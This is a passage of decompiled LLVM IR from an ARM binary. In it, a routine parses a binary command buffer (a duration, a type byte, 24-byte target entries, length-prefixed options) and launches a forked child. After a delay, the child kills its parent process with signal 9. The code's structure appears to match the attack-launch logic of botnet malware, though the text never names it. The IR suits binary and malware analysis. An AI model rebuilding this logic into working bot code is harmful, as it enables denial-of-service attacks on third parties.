  %tmp23 = icmp slt i32 %v0_ad58, 1
  br i1 %tmp23, label %bb24, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_ad40
  store i32 1, i32* %r5.global-to-local, align 4
  br label %bb25

bb24:                                             ; preds = %dec_label_pc_ad40
  %. = zext i1 %v7_ad5c to i32
  store i32 %., i32* %r5.global-to-local, align 4
  %v2_ad74 = icmp eq i1 %v7_ad5c, false
  br i1 %v2_ad74, label %bb26, label %bb25

bb25:                                             ; preds = %.thread2, %bb24
  %v3_ad78 = load i32, i32* %stack_var_-32, align 4
  store i32 %v3_ad78, i32* %r4.global-to-local, align 4
  ret i32 %v0_ad58

bb26:                                             ; preds = %bb24
  %v0_ad7c = call i32 @_fork()
  %v7_ad80 = icmp eq i32 %v0_ad7c, -1
  store i32 %v0_ad7c, i32* %r4.global-to-local, align 4
  br i1 %v7_ad80, label %dec_label_pc_adb0, label %dec_label_pc_ad8c

dec_label_pc_ad8c:                                ; preds = %bb26
  %v2_ad8c = icmp eq i32 %v0_ad7c, 0
  br i1 %v2_ad8c, label %dec_label_pc_ad94, label %dec_label_pc_adb8

dec_label_pc_ad94:                                ; preds = %dec_label_pc_ad8c
  %v0_ad94 = load i32, i32* %r6.global-to-local, align 4
  %v1_ad98 = call i32 @_sleep(i32 %v0_ad94)
  %v0_ad9c = call i32 @_getppid()
  %v2_ada4 = call i32 @_kill(i32 %v0_ad9c, i32 9)
  %v0_ada8 = load i32, i32* %r4.global-to-local, align 4
  %v1_adac = call i32 @_exit(i32 %v0_ada8)
  br label %dec_label_pc_adb0

dec_label_pc_adb0:                                ; preds = %bb26, %dec_label_pc_ad94
  %v0_adb0 = load i32, i32* %r5.global-to-local, align 4
  %v1_adb4 = call i32 @_exit(i32 %v0_adb0)
  br label %dec_label_pc_adb8

dec_label_pc_adb8:                                ; preds = %dec_label_pc_ad8c, %dec_label_pc_adb0
  %v2_adbc = load i8, i8* bitcast (i8** @global_var_1d934.109 to i8*), align 4
  %v3_adbc = zext i8 %v2_adbc to i32
  %v2_adc0 = icmp eq i8 %v2_adbc, 0
  br i1 %v2_adc0, label %dec_label_pc_ae04, label %dec_label_pc_adc8

dec_label_pc_adc8:                                ; preds = %dec_label_pc_adb8
  %v2_adcc = load i32, i32* @global_var_1d938.111, align 4
  %v1_add0 = inttoptr i32 %v2_adcc to i32*
  %v2_add0 = load i32, i32* %v1_add0, align 4
  %v1_add4 = add i32 %v2_add0, 4
  %v2_add4 = inttoptr i32 %v1_add4 to i8*
  %v3_add4 = load i8, i8* %v2_add4, align 1
  %v4_add4 = zext i8 %v3_add4 to i32
  %v1_add8 = load i32, i32* %r7.global-to-local, align 4
  %v9_add8 = icmp eq i32 %v4_add4, %v1_add8
  br i1 %v9_add8, label %dec_label_pc_ae0c, label %dec_label_pc_adf8.preheader

dec_label_pc_adf8.preheader:                      ; preds = %dec_label_pc_adc8
  %v1_addc = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_adf8

dec_label_pc_ade8:                                ; preds = %dec_label_pc_adf8
  %v4_ade8 = mul i32 %v1_adf8, 4
  %v5_ade8 = add i32 %v4_ade8, %v2_adcc
  %v6_ade8 = inttoptr i32 %v5_ade8 to i32*
  %v7_ade8 = load i32, i32* %v6_ade8, align 4
  %v1_adec = add i32 %v7_ade8, 4
  %v2_adec = inttoptr i32 %v1_adec to i8*
  %v3_adec = load i8, i8* %v2_adec, align 1
  %v4_adec = zext i8 %v3_adec to i32
  %v9_adf0 = icmp eq i32 %v4_adec, %v1_add8
  br i1 %v9_adf0, label %dec_label_pc_ae0c, label %dec_label_pc_adf8

dec_label_pc_adf8:                                ; preds = %dec_label_pc_adf8.preheader, %dec_label_pc_ade8
  %v0_adf8 = phi i32 [ %v1_addc, %dec_label_pc_adf8.preheader ], [ %v1_adf8, %dec_label_pc_ade8 ]
  %v1_adf8 = add i32 %v0_adf8, 1
  %v9_adfc = icmp eq i32 %v1_adf8, %v3_adbc
  br i1 %v9_adfc, label %dec_label_pc_ae04, label %dec_label_pc_ade8

dec_label_pc_ae04:                                ; preds = %dec_label_pc_adf8, %dec_label_pc_adb8, %dec_label_pc_ae0c
  %v1_ae08 = call i32 @_exit(i32 0)
  %v0_ae20.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_ae0c

dec_label_pc_ae0c:                                ; preds = %dec_label_pc_ade8, %dec_label_pc_adc8, %dec_label_pc_ae04
  %v0_ae20 = phi i32 [ %v2_add0, %dec_label_pc_adc8 ], [ %v0_ae20.pre, %dec_label_pc_ae04 ], [ %v7_ade8, %dec_label_pc_ade8 ]
  %v1_ae20 = inttoptr i32 %v0_ae20 to i32*
  %v2_ae20 = load i32, i32* %v1_ae20, align 4
  call void @__pseudo_branch(i32 %v2_ae20)
  br label %dec_label_pc_ae04

; uselistorder directives
  uselistorder i32 %v1_adf8, { 2, 0, 1 }
  uselistorder i32 %v0_ad7c, { 1, 2, 0 }
  uselistorder i1 %v7_ad5c, { 1, 0 }
  uselistorder i32 %v0_ad58, { 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_ae0c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ae04, { 2, 0, 1 }
  uselistorder label %dec_label_pc_adf8, { 1, 0 }
  uselistorder label %dec_label_pc_adb8, { 1, 0 }
  uselistorder label %dec_label_pc_adb0, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
}

define i32 @function_ae30(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_ae30:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v9_ae30 = load i32, i32* @r6, align 4
  %v12_ae30 = load i32, i32* @r7, align 4
  %v18_ae30 = load i32, i32* @sb, align 4
  %v21_ae30 = load i32, i32* @sl, align 4
  %v27_ae30 = load i32, i32* @lr, align 4
  %v7_ae34 = icmp eq i32 %arg2, 3
  store i1 %v7_ae34, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* @r5, align 4
  %v0_ae40 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_ae40, i32* @r4, align 4
  %tmp33 = icmp ult i32 %arg2, 4
  br i1 %tmp33, label %dec_label_pc_ae54, label %dec_label_pc_ae48

dec_label_pc_ae48:                                ; preds = %dec_label_pc_ae30
  %v7_ae48 = icmp eq i32 %arg2, 4
  store i1 %v7_ae48, i1* %cpsr_z.global-to-local, align 1
  %v1_ae4c = inttoptr i32 %v0_ae40 to i32*
  %v2_ae4c = load i32, i32* %v1_ae4c, align 4
  store i32 %v2_ae4c, i32* @sl, align 4
  br i1 %v7_ae48, label %dec_label_pc_ae54, label %dec_label_pc_ae5c

dec_label_pc_ae54:                                ; preds = %dec_label_pc_ae78, %.dec_label_pc_ae54_crit_edge, %dec_label_pc_ae48, %dec_label_pc_ae6c, %dec_label_pc_ae5c, %dec_label_pc_ae30
  %v29_ae58 = phi i32 [ %v29_ae58.pre, %.dec_label_pc_ae54_crit_edge ], [ %v0_ae40, %dec_label_pc_ae78 ], [ %v0_ae40, %dec_label_pc_ae48 ], [ %v0_ae40, %dec_label_pc_ae6c ], [ %v0_ae40, %dec_label_pc_ae5c ], [ %v0_ae40, %dec_label_pc_ae30 ]
  store i32 %v9_ae30, i32* @r6, align 4
  store i32 %v12_ae30, i32* @r7, align 4
  store i32 %v18_ae30, i32* @sb, align 4
  store i32 %v21_ae30, i32* @sl, align 4
  ret i32 %v29_ae58

dec_label_pc_ae5c:                                ; preds = %dec_label_pc_ae48
  %v7_ae5c = icmp eq i32 %arg2, 5
  store i1 %v7_ae5c, i1* %cpsr_z.global-to-local, align 1
  %v1_ae60 = add i32 %v0_ae40, 4
  %v2_ae60 = inttoptr i32 %v1_ae60 to i8*
  %v3_ae60 = load i8, i8* %v2_ae60, align 1
  %v4_ae60 = zext i8 %v3_ae60 to i32
  store i32 %v4_ae60, i32* %r1.global-to-local, align 4
  br i1 %v7_ae5c, label %dec_label_pc_ae54, label %dec_label_pc_ae6c

dec_label_pc_ae6c:                                ; preds = %dec_label_pc_ae5c
  %v1_ae6c = add i32 %v0_ae40, 5
  %v2_ae6c = inttoptr i32 %v1_ae6c to i8*
  %v3_ae6c = load i8, i8* %v2_ae6c, align 1
  %v4_ae6c = zext i8 %v3_ae6c to i32
  store i32 %v4_ae6c, i32* @r7, align 4
  %v2_ae70 = icmp eq i8 %v3_ae6c, 0
  store i1 %v2_ae70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ae70, label %dec_label_pc_ae54, label %dec_label_pc_ae78

dec_label_pc_ae78:                                ; preds = %dec_label_pc_ae6c
  %v3_ae78 = mul nuw nsw i32 %v4_ae6c, 4
  store i32 %v3_ae78, i32* @sb, align 4
  %v1_ae7c = add i32 %arg2, -6
  store i32 %v1_ae7c, i32* @r6, align 4
  %v2_ae80 = mul nuw nsw i32 %v4_ae6c, 5
  store i32 %v2_ae80, i32* @r8, align 4
  %v3_ae84 = icmp ult i32 %v1_ae7c, %v2_ae80
  %v9_ae84 = icmp eq i32 %v1_ae7c, %v2_ae80
  store i1 %v9_ae84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_ae84, label %dec_label_pc_ae54, label %dec_label_pc_ae8c

dec_label_pc_ae8c:                                ; preds = %dec_label_pc_ae78
  store i32 %v4_ae6c, i32* %r0.global-to-local, align 4
  store i32 24, i32* %r1.global-to-local, align 4
  %v2_ae94 = call i32 @_calloc(i32 %v4_ae6c, i32 24)
  store i32 %v2_ae94, i32* %r0.global-to-local, align 4
  %v0_ae98 = load i32, i32* @r7, align 4
  %v2_ae98 = icmp eq i32 %v0_ae98, 0
  store i1 %v2_ae98, i1* %cpsr_z.global-to-local, align 1
  %v0_aea0 = load i32, i32* @r4, align 4
  %v1_aea0 = add i32 %v0_aea0, 6
  store i32 %v1_aea0, i32* %fp.global-to-local, align 4
  %tmp27 = icmp slt i32 %v0_ae98, 1
  br i1 %tmp27, label %dec_label_pc_aef8thread-pre-split, label %dec_label_pc_aea8

dec_label_pc_aea8:                                ; preds = %dec_label_pc_ae8c
  store i32 %v2_ae94, i32* %r1.global-to-local, align 4
  %v1_aeac = load i32, i32* @r8, align 4
  %v2_aeac = add i32 %v1_aeac, %v0_aea0
  store i32 %v2_aeac, i32* %ip.global-to-local, align 4
  store i32 %v0_aea0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  store i32 2, i32* @r4, align 4
  br label %dec_label_pc_aebc

dec_label_pc_aebc:                                ; preds = %dec_label_pc_aebc.dec_label_pc_aebc_crit_edge, %dec_label_pc_aea8
  %v2_aecc = phi i32 [ %v1_aee0, %dec_label_pc_aebc.dec_label_pc_aebc_crit_edge ], [ %v2_ae94, %dec_label_pc_aea8 ]
  %v1_aec8 = phi i32 [ %v1_aec8.pre, %dec_label_pc_aebc.dec_label_pc_aebc_crit_edge ], [ %v2_aeac, %dec_label_pc_aea8 ]
  %v0_aec4 = phi i32 [ %v0_aebc.pre, %dec_label_pc_aebc.dec_label_pc_aebc_crit_edge ], [ %v0_aea0, %dec_label_pc_aea8 ]
  %v1_aebc = add i32 %v0_aec4, 10
  %v2_aebc = inttoptr i32 %v1_aebc to i8*
  %v3_aebc = load i8, i8* %v2_aebc, align 1
  %v1_aec0 = add i32 %v0_aec4, 6
  %v2_aec0 = inttoptr i32 %v1_aec0 to i32*
  %v3_aec0 = load i32, i32* %v2_aec0, align 4
  store i32 %v3_aec0, i32* %r2.global-to-local, align 4
  %v1_aec4 = add i32 %v0_aec4, 5
  store i32 %v1_aec4, i32* %r0.global-to-local, align 4
  %v9_aec8 = icmp eq i32 %v1_aec4, %v1_aec8
  store i1 %v9_aec8, i1* %cpsr_z.global-to-local, align 1
  %v3_aecc = add i32 %v2_aecc, 20
  %v4_aecc = inttoptr i32 %v3_aecc to i8*
  store i8 %v3_aebc, i8* %v4_aecc, align 1
  %v0_aed0 = load i32, i32* %r2.global-to-local, align 4
  %v1_aed0 = load i32, i32* %r1.global-to-local, align 4
  %v2_aed0 = add i32 %v1_aed0, 4
  %v3_aed0 = inttoptr i32 %v2_aed0 to i32*
  store i32 %v0_aed0, i32* %v3_aed0, align 4
  %v0_aed4 = load i32, i32* %r2.global-to-local, align 4
  %v1_aed4 = load i32, i32* %r1.global-to-local, align 4
  %v2_aed4 = add i32 %v1_aed4, 16
  %v3_aed4 = inttoptr i32 %v2_aed4 to i32*
  store i32 %v0_aed4, i32* %v3_aed4, align 4
  %v0_aed8 = load i32, i32* @r4, align 4
  %v1_aed8 = trunc i32 %v0_aed8 to i8
  %v2_aed8 = load i32, i32* %r1.global-to-local, align 4
  %v3_aed8 = inttoptr i32 %v2_aed8 to i8*
  store i8 %v1_aed8, i8* %v3_aed8, align 1
  %v0_aedc = load i32, i32* %lr.global-to-local, align 4
  %v1_aedc = trunc i32 %v0_aedc to i8
  %v2_aedc = load i32, i32* %r1.global-to-local, align 4
  %v3_aedc = add i32 %v2_aedc, 1
  %v4_aedc = inttoptr i32 %v3_aedc to i8*
  store i8 %v1_aedc, i8* %v4_aedc, align 1
  %v0_aee0 = load i32, i32* %r1.global-to-local, align 4
  %v1_aee0 = add i32 %v0_aee0, 24
  store i32 %v1_aee0, i32* %r1.global-to-local, align 4
  %v0_aee4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_aee4, label %dec_label_pc_aee8, label %dec_label_pc_aebc.dec_label_pc_aebc_crit_edge

dec_label_pc_aebc.dec_label_pc_aebc_crit_edge:    ; preds = %dec_label_pc_aebc
  %v0_aebc.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_aec8.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_aebc

dec_label_pc_aee8:                                ; preds = %dec_label_pc_aebc
  %v0_aee8 = load i32, i32* @sb, align 4
  %v1_aee8 = load i32, i32* @r7, align 4
  %v1_aeec = load i32, i32* @r5, align 4
  %sum = add i32 %v1_aee8, %v0_aee8
  %v2_aeec = sub i32 %v1_aeec, %sum
  %v0_aef0 = load i32, i32* %r0.global-to-local, align 4
  %v1_aef0 = add i32 %v0_aef0, 6
  store i32 %v1_aef0, i32* %fp.global-to-local, align 4
  %v1_aef4 = add i32 %v2_aeec, -6
  store i32 %v1_aef4, i32* @r6, align 4
  br label %dec_label_pc_aef8

dec_label_pc_aef8thread-pre-split:                ; preds = %dec_label_pc_ae8c
  %v0_aef8.pr = load i32, i32* @r6, align 4
  br label %dec_label_pc_aef8

dec_label_pc_aef8:                                ; preds = %dec_label_pc_aef8thread-pre-split, %dec_label_pc_aee8
  %v0_af04 = phi i32 [ %v1_aea0, %dec_label_pc_aef8thread-pre-split ], [ %v1_aef0, %dec_label_pc_aee8 ]
  %v1_aefc = phi i32 [ %v0_aef8.pr, %dec_label_pc_aef8thread-pre-split ], [ %v1_aef4, %dec_label_pc_aee8 ]
  %v2_aef8 = icmp eq i32 %v1_aefc, 0
  store i1 %v2_aef8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_aef8, label %dec_label_pc_b030, label %dec_label_pc_af04

dec_label_pc_af04:                                ; preds = %dec_label_pc_aef8
  %v1_af04 = inttoptr i32 %v0_af04 to i8*
  %v2_af04 = load i8, i8* %v1_af04, align 1
  %v3_af04 = zext i8 %v2_af04 to i32
  store i32 %v3_af04, i32* @sb, align 4
  %v2_af08 = icmp eq i8 %v2_af04, 0
  store i1 %v2_af08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_af08, label %dec_label_pc_afe8, label %dec_label_pc_af18

dec_label_pc_af18:                                ; preds = %dec_label_pc_af04
  store i32 %v3_af04, i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_af20 = call i32 @_calloc(i32 %v3_af04, i32 8)
  store i32 %v2_af20, i32* %r0.global-to-local, align 4
  %v0_af24 = load i32, i32* @sb, align 4
  %v2_af24 = icmp eq i32 %v0_af24, 0
  store i1 %v2_af24, i1* %cpsr_z.global-to-local, align 1
  %tmp28 = icmp slt i32 %v0_af24, 1
  br i1 %tmp28, label %dec_label_pc_afe8, label %dec_label_pc_af34

dec_label_pc_af34:                                ; preds = %dec_label_pc_af18
  %v0_af34 = load i32, i32* @r6, align 4
  %v1_af34 = add i32 %v0_af34, -1
  store i32 %v1_af34, i32* %r2.global-to-local, align 4
  %v7_af34 = icmp eq i32 %v0_af34, 1
  store i1 %v7_af34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_af34, label %dec_label_pc_b030, label %dec_label_pc_af3c

dec_label_pc_af3c:                                ; preds = %dec_label_pc_af34
  %v0_af3c = load i32, i32* %fp.global-to-local, align 4
  %v1_af3c = add i32 %v0_af3c, 1
  %v2_af3c = inttoptr i32 %v1_af3c to i8*
  %v3_af3c = load i8, i8* %v2_af3c, align 1
  %v1_af40 = add i32 %v0_af34, -2
  store i32 %v1_af40, i32* %r2.global-to-local, align 4
  %v7_af40 = icmp eq i32 %v1_af34, 1
  store i1 %v7_af40, i1* %cpsr_z.global-to-local, align 1
  %v3_af44 = add i32 %v2_af20, 4
  %v4_af44 = inttoptr i32 %v3_af44 to i8*
  store i8 %v3_af3c, i8* %v4_af44, align 1
  %v0_af48 = load i32, i32* %fp.global-to-local, align 4
  %v1_af48 = add i32 %v0_af48, 1
  store i32 %v1_af48, i32* %r0.global-to-local, align 4
  %v0_af4c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_af4c, label %dec_label_pc_b030, label %dec_label_pc_af50

dec_label_pc_af50:                                ; preds = %dec_label_pc_af3c
  %v1_af50 = add i32 %v0_af48, 2
  %v2_af50 = inttoptr i32 %v1_af50 to i8*
  %v3_af50 = load i8, i8* %v2_af50, align 1
  %v4_af50 = zext i8 %v3_af50 to i32
  store i32 %v4_af50, i32* @r4, align 4
  %v0_af54 = load i32, i32* %r2.global-to-local, align 4
  %v1_af54 = add i32 %v0_af54, -1
  store i32 %v1_af54, i32* @r8, align 4
  %v9_af58 = icmp eq i32 %v1_af54, %v4_af50
  store i1 %v9_af58, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_af50, i32* %r0.global-to-local, align 4
  %v5_af60 = icmp slt i32 %v1_af54, %v4_af50
  br i1 %v5_af60, label %dec_label_pc_b030, label %dec_label_pc_af64

dec_label_pc_af64:                                ; preds = %dec_label_pc_af50
  store i32 %v2_af20, i32* @r5, align 4
  %v1_af6c = add i32 %v2_af20, 8
  %v1_af70 = add i32 %v0_af48, 3
  store i32 %v1_af70, i32* @r6, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_afb4

dec_label_pc_af80:                                ; preds = %dec_label_pc_afb4
  %v0_af80 = load i32, i32* @r8, align 4
  %v1_af80 = load i32, i32* @r4, align 4
  %v2_af80 = sub i32 %v0_af80, %v1_af80
  store i32 %v2_af80, i32* %r2.global-to-local, align 4
  %v9_af80 = icmp eq i32 %v0_af80, %v1_af80
  store i1 %v9_af80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_af80, label %dec_label_pc_b030, label %dec_label_pc_af88

dec_label_pc_af88:                                ; preds = %dec_label_pc_af80
  %v1_af88 = load i32, i32* @r6, align 4
  %v2_af88 = add i32 %v1_af88, %v1_af80
  %v3_af88 = inttoptr i32 %v2_af88 to i8*
  %v4_af88 = load i8, i8* %v3_af88, align 1
  store i32 %v2_af88, i32* %r0.global-to-local, align 4
  %v1_af90 = add i32 %v2_af80, -1
  store i32 %v1_af90, i32* %r2.global-to-local, align 4
  %v7_af90 = icmp eq i32 %v2_af80, 1
  store i1 %v7_af90, i1* %cpsr_z.global-to-local, align 1
  %v3_af94 = add i32 %v2_af94, 4
  %v4_af94 = inttoptr i32 %v3_af94 to i8*
  store i8 %v4_af88, i8* %v4_af94, align 1
  %v0_af98 = load i32, i32* %r0.global-to-local, align 4
  %v0_af9c = load i32, i32* %r2.global-to-local, align 4
  %v1_af9c = add i32 %v0_af9c, -1
  store i32 %v1_af9c, i32* @r8, align 4
  %v1_afa0 = add i32 %v0_af98, 2
  store i32 %v1_afa0, i32* @r6, align 4
  %v0_afa4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_afa4, label %dec_label_pc_b030, label %dec_label_pc_afa8

dec_label_pc_afa8:                                ; preds = %dec_label_pc_af88
  %v1_af98 = add i32 %v0_af98, 1
  %v2_afa8 = inttoptr i32 %v1_af98 to i8*
  %v3_afa8 = load i8, i8* %v2_afa8, align 1
  %v4_afa8 = zext i8 %v3_afa8 to i32
  store i32 %v4_afa8, i32* @r4, align 4
  %v2_afac = sub i32 %v1_af9c, %v4_afa8
  %tmp30 = sub i32 0, %v2_afac
  %v6_afac = and i32 %v1_af9c, %tmp30
  %v7_afac = icmp slt i32 %v6_afac, 0
  %v8_afac = icmp slt i32 %v2_afac, 0
  %v9_afac = icmp eq i32 %v1_af9c, %v4_afa8
  store i1 %v9_afac, i1* %cpsr_z.global-to-local, align 1
  %v2_afb0 = xor i1 %v8_afac, %v7_afac
  br i1 %v2_afb0, label %dec_label_pc_b030, label %dec_label_pc_afb4

dec_label_pc_afb4:                                ; preds = %dec_label_pc_afa8, %dec_label_pc_af64
  %v0_afb8 = phi i32 [ %v4_af50, %dec_label_pc_af64 ], [ %v4_afa8, %dec_label_pc_afa8 ]
  %v2_af94 = phi i32 [ %v1_af6c, %dec_label_pc_af64 ], [ %v1_afd8, %dec_label_pc_afa8 ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_afb8 = add nuw nsw i32 %v0_afb8, 1
  store i32 %v1_afb8, i32* %r0.global-to-local, align 4
  %v2_afbc = call i32 @_calloc(i32 %v1_afb8, i32 1)
  store i32 %v2_afbc, i32* %r0.global-to-local, align 4
  %v0_afc0 = load i32, i32* @r6, align 4
  store i32 %v0_afc0, i32* %r1.global-to-local, align 4
  %v1_afc4 = load i32, i32* @r5, align 4
  %v2_afc4 = inttoptr i32 %v1_afc4 to i32*
  store i32 %v2_afbc, i32* %v2_afc4, align 4
  %v0_afc8 = load i32, i32* @r4, align 4
  store i32 %v0_afc8, i32* %r2.global-to-local, align 4
  %v3_afcc = call i32 @function_14688(i32 %v2_afbc, i32 %v0_afc0, i32 %v0_afc8)
  store i32 %v3_afcc, i32* %r0.global-to-local, align 4
  store i32 %v2_af94, i32* @r5, align 4
  %v0_afd4 = load i32, i32* %fp.global-to-local, align 4
  %v1_afd4 = add i32 %v0_afd4, 1
  store i32 %v1_afd4, i32* %fp.global-to-local, align 4
  %v1_afd8 = add i32 %v2_af94, 8
  store i32 %v1_afd8, i32* %ip.global-to-local, align 4
  %v1_afdc = load i32, i32* @sb, align 4
  %v9_afdc = icmp eq i32 %v1_afd4, %v1_afdc
  store i1 %v9_afdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_afdc, label %dec_label_pc_afe8, label %dec_label_pc_af80

dec_label_pc_afe8:                                ; preds = %dec_label_pc_afb4, %dec_label_pc_af18, %dec_label_pc_af04
  %stack_var_-48.1 = phi i32 [ %v3_af04, %dec_label_pc_af04 ], [ %v0_af24, %dec_label_pc_af18 ], [ %v0_af24, %dec_label_pc_afb4 ]
  %stack_var_-52.2 = phi i32 [ %v3_af04, %dec_label_pc_af04 ], [ %v2_af20, %dec_label_pc_af18 ], [ %v2_af20, %dec_label_pc_afb4 ]
  %v0_afe8 = call i32 @___errno_location()
  %v0_afec = load i32, i32* @sl, align 4
  store i32 %stack_var_-48.1, i32* %ip.global-to-local, align 4
  %v3_aff8 = mul i32 %v0_afec, 16777216
  %v1_afec = mul i32 %v0_afec, 256
  %v4_affc = and i32 %v1_afec, 16711680
  %v5_affc = or i32 %v4_affc, %v3_aff8
  store i32 %v5_affc, i32* %r1.global-to-local, align 4
  %v1_aff4 = udiv i32 %v0_afec, 256
  %v3_b000 = and i32 %v1_aff4, 65280
  store i32 %v3_b000, i32* %r2.global-to-local, align 4
  %v2_b008 = inttoptr i32 %v0_afe8 to i32*
  store i32 0, i32* %v2_b008, align 4
  %v0_b00c = load i32, i32* %r2.global-to-local, align 4
  %v1_b00c = load i32, i32* @sl, align 4
  %v4_b00c = udiv i32 %v1_b00c, 16777216
  %v5_b00c = or i32 %v4_b00c, %v0_b00c
  %v0_b010 = load i32, i32* %ip.global-to-local, align 4
  store i32 %stack_var_-52.2, i32* %ip.global-to-local, align 4
  %v1_b018 = load i32, i32* %r1.global-to-local, align 4
  %v2_b018 = or i32 %v5_b00c, %v1_b018
  store i32 %v2_b018, i32* %r0.global-to-local, align 4
  store i32 %v4_ae60, i32* %r1.global-to-local, align 4
  %v0_b024 = load i32, i32* @r7, align 4
  store i32 %v0_b024, i32* %r2.global-to-local, align 4
  %v6_b02c = trunc i32 %v0_b010 to i8
  %v7_b02c = call i32 @function_ad40(i32 %v2_b018, i32 %v4_ae60, i32 %v0_b024, i32 %v2_ae94, i8 %v6_b02c, i32 %stack_var_-52.2)
  store i32 %v7_b02c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b030

dec_label_pc_b030:                                ; preds = %dec_label_pc_afa8, %dec_label_pc_af88, %dec_label_pc_af80, %dec_label_pc_af50, %dec_label_pc_af3c, %dec_label_pc_af34, %dec_label_pc_aef8, %dec_label_pc_afe8
  %stack_var_-52.3 = phi i32 [ 0, %dec_label_pc_aef8 ], [ %stack_var_-52.2, %dec_label_pc_afe8 ], [ %v2_af20, %dec_label_pc_af34 ], [ %v2_af20, %dec_label_pc_af3c ], [ %v2_af20, %dec_label_pc_af50 ], [ %v2_af20, %dec_label_pc_af80 ], [ %v2_af20, %dec_label_pc_af88 ], [ %v2_af20, %dec_label_pc_afa8 ]
  store i32 %v2_ae94, i32* %r1.global-to-local, align 4
  %v2_b034 = icmp eq i32 %v2_ae94, 0
  store i1 %v2_b034, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b034, label %bb31, label %bb

bb:                                               ; preds = %dec_label_pc_b030
  store i32 %v2_ae94, i32* %r0.global-to-local, align 4
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_b030, %bb
  store i32 45120, i32* %lr.global-to-local, align 4
  %v1_b03c = xor i1 %v2_b034, true
  call void @__pseudo_cond_branch(i1 %v1_b03c, i32 ptrtoint (i32* @global_var_8de4.113 to i32))
  %v2_b044 = icmp eq i32 %stack_var_-52.3, 0
  store i1 %v2_b044, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b044, label %.dec_label_pc_ae54_crit_edge, label %dec_label_pc_b04c

.dec_label_pc_ae54_crit_edge:                     ; preds = %bb31
  %v29_ae58.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ae54

dec_label_pc_b04c:                                ; preds = %bb31
  %v0_b04c = load i32, i32* @sb, align 4
  %v2_b04c = icmp eq i32 %v0_b04c, 0
  store i1 %v2_b04c, i1* %cpsr_z.global-to-local, align 1
  %tmp32 = icmp slt i32 %v0_b04c, 1
  br i1 %tmp32, label %dec_label_pc_b074, label %dec_label_pc_b054

dec_label_pc_b054:                                ; preds = %dec_label_pc_b04c
  br label %dec_label_pc_b058

dec_label_pc_b058:                                ; preds = %dec_label_pc_b058, %dec_label_pc_b054
  %v0_b064 = phi i32 [ %v1_b064, %dec_label_pc_b058 ], [ 0, %dec_label_pc_b054 ]
  store i32 %stack_var_-52.3, i32* %ip.global-to-local, align 4
  %v4_b05c = mul i32 %v0_b064, 8
  %v5_b05c = add i32 %v4_b05c, %stack_var_-52.3
  %v6_b05c = inttoptr i32 %v5_b05c to i32*
  %v7_b05c = load i32, i32* %v6_b05c, align 4
  store i32 %v7_b05c, i32* %r0.global-to-local, align 4
  %v2_b060 = icmp eq i32 %v7_b05c, 0
  store i1 %v2_b060, i1* %cpsr_z.global-to-local, align 1
  %v1_b064 = add i32 %v0_b064, 1
  store i32 45164, i32* %lr.global-to-local, align 4
  %v1_b068 = xor i1 %v2_b060, true
  call void @__pseudo_cond_branch(i1 %v1_b068, i32 ptrtoint (i32* @global_var_8de4.113 to i32))
  %v0_b06c = load i32, i32* @sb, align 4
  %v9_b06c = icmp eq i32 %v0_b06c, %v1_b064
  store i1 %v9_b06c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b06c, label %dec_label_pc_b074, label %dec_label_pc_b058

dec_label_pc_b074:                                ; preds = %dec_label_pc_b058, %dec_label_pc_b04c
  store i32 %stack_var_-52.3, i32* %r0.global-to-local, align 4
  store i32 %v9_ae30, i32* @r6, align 4
  store i32 %v12_ae30, i32* @r7, align 4
  store i32 %v18_ae30, i32* @sb, align 4
  store i32 %v21_ae30, i32* @sl, align 4
  store i32 %v27_ae30, i32* %lr.global-to-local, align 4
  %v1_b080 = call i32 @_free(i32 %stack_var_-52.3)
  store i32 %v1_b080, i32* %r0.global-to-local, align 4
  ret i32 %v1_b080

; uselistorder directives
  uselistorder i32 %stack_var_-52.3, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_afec, { 2, 0, 1 }
  uselistorder i32 %stack_var_-52.2, { 1, 0, 2 }
  uselistorder i32 %v1_afd8, { 1, 0 }
  uselistorder i32 %v2_af94, { 2, 1, 0 }
  uselistorder i32 %v2_afac, { 1, 0 }
  uselistorder i32 %v4_afa8, { 0, 2, 1, 3 }
  uselistorder i32 %v1_af9c, { 2, 0, 1, 3 }
